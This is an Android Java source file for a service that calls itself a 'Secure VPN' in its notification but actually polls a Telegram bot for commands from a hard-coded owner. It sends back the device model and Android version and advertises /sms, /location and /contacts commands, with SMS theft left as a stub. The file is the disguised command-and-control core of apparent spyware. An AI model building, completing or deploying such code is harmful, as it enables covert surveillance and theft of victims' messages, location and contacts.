package com.security.vpn;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import androidx.core.app.NotificationCompat;
import android.util.Log;
import okhttp3.*;
import org.json.JSONArray;
import org.json.JSONObject;
import java.io.IOException;

public class TelegramService extends Service {
    private static final String TAG = "TelegramService";
    private final OkHttpClient client = new OkHttpClient();
    private int lastUpdateId = 0;

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        createNotificationChannel();
        Notification notification = new NotificationCompat.Builder(this, "VPN_SERVICE")
                .setContentTitle("Secure VPN")
                .setContentText("VPN is running...")
                .setSmallIcon(android.R.drawable.ic_lock_lock)
                .build();
        startForeground(1, notification);

        new Thread(new Runnable() {
            @Override
            public void run() {
                while (true) {
                    pollTelegram();
                    try { Thread.sleep(3000); } catch (InterruptedException e) {}
                }
            }
        }).start();

        return START_STICKY;
    }

    private void pollTelegram() {
        String url = Config.TELEGRAM_API + "getUpdates?offset=" + (lastUpdateId + 1);
        Request request = new Request.Builder().url(url).build();

        client.newCall(request).enqueue(new Callback() {
            @Override
            public void onFailure(Call call, IOException e) {
                Log.e(TAG, "Polling failed: " + e.getMessage());
            }

            @Override
            public void onResponse(Call call, Response response) throws IOException {
                if (response.isSuccessful()) {
                    try {
                        String jsonData = response.body().string();
                        JSONObject jsonObject = new JSONObject(jsonData);
                        JSONArray updates = jsonObject.getJSONArray("result");

                        for (int i = 0; i < updates.length(); i++) {
                            JSONObject update = updates.getJSONObject(i);
                            lastUpdateId = update.getInt("update_id");
                            
                            if (update.has("message")) {
                                JSONObject message = update.getJSONObject("message");
                                String text = message.optString("text", "");
                                String chatId = String.valueOf(message.getJSONObject("chat").getLong("id"));

                                if (chatId.equals(Config.OWNER_ID)) {
                                    handleCommand(text, chatId);
                                }
                            }
                        }
                    } catch (Exception e) {
                        Log.e(TAG, "Error parsing JSON: " + e.getMessage());
                    }
                }
            }
        });
    }

    private void handleCommand(String command, String chatId) {
        if (command.startsWith("/start")) {
            String deviceInfo = "Device: " + Build.MODEL + "\nAndroid: " + Build.VERSION.RELEASE;
            sendMessage(chatId, "Welcome Owner!\n" + deviceInfo + "\n\nMenu:\n/sms - Get SMS\n/location - Get GPS\n/contacts - Get Contacts");
        } else if (command.equals("/sms")) {
            sendMessage(chatId, "Fetching SMS... (Permissions required)");
            // Logic to fetch SMS would go here
        }
    }

    private void sendMessage(String chatId, String text) {
        String url = Config.TELEGRAM_API + "sendMessage?chat_id=" + chatId + "&text=" + text;
        Request request = new Request.Builder().url(url).build();
        client.newCall(request).enqueue(new Callback() {
            @Override
            public void onFailure(Call call, IOException e) {}
            @Override
            public void onResponse(Call call, Response response) throws IOException {}
        });
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel serviceChannel = new NotificationChannel(
                    "VPN_SERVICE",
                    "VPN Service Channel",
                    NotificationManager.IMPORTANCE_DEFAULT
            );
            NotificationManager manager = getSystemService(NotificationManager.class);
            manager.createNotificationChannel(serviceChannel);
        }
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }
}
